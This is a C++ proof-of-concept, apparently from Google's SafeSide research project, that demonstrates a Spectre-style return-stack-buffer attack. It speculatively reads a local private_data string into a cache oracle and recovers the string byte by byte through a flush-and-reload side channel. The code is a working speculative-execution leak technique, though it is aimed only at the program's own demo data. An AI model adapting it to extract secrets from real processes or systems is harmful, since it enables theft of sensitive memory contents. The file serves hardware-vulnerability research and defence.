/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

// Global variable stores for avoiding to pass data through function arguments.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

#if SAFESIDE_ARM64
// On ARM we need a local function to return to because of local vs. global
// relocation mismatches.
void ReturnHandler() {
  JumpToAfterSpeculation();
}
#endif

// Call a "UnwindStackAndSlowlyReturnTo" function which unwinds the stack
// jumping back to the "afterspeculation" label in the "LeakByte" function
// never executing the code that follows.
SAFESIDE_NEVER_INLINE
static void Speculation() {
#if SAFESIDE_X64 || SAFESIDE_IA32 || SAFESIDE_PPC
  const void *return_address = afterspeculation;
#elif SAFESIDE_ARM64
  const void *return_address = reinterpret_cast<const void *>(ReturnHandler);
#else
#  error Unsupported CPU.
#endif

  UnwindStackAndSlowlyReturnTo(return_address); // Never returns back here.

  // Everything that follows this is architecturally dead code. Never reached.
  // However, the first two statements are executed speculatively.
  const std::array<BigByte, 256> &oracle = *oracle_ptr;
  ForceRead(oracle.data() + static_cast<size_t>(
      private_data[current_offset]));

  std::cout << "If this is printed, it signifies a fatal error. "
            << "This print statement is architecturally dead." << std::endl;

  // Avoid optimizing out everything that follows the speculation call because
  // of the exit. Clang does that when the exit call is unconditional.
  if (strlen(private_data) != 0) {
    exit(EXIT_FAILURE);
  }
}

static char LeakByte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle(); // Save the pointer to global storage.

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

#if SAFESIDE_ARM64 || SAFESIDE_PPC
    // On ARM and PowerPC we have to manually backup registers that are
    // callee-saved, because the "speculation" method will never restore their
    // backups.
    BackupCalleeSavedRegsAndReturnAddress();
#endif

    // Yields two "call" instructions, one "ret" instruction, speculatively
    // accesses the oracle and ends up on the afterspeculation label below.
    Speculation();

    // Return target for the UnwindStackAndSlowlyReturnTo function.
    asm volatile(
        "_afterspeculation:\n" // For MacOS.
        "afterspeculation:\n"); // For Linux.

#if SAFESIDE_ARM64 || SAFESIDE_PPC
    RestoreCalleeSavedRegs();
#endif

    std::pair<bool, char> result =
        sidechannel.AddHitAndRecomputeScores();

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    current_offset = i; // Saving the index to the global storage.
    std::cout << LeakByte();
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
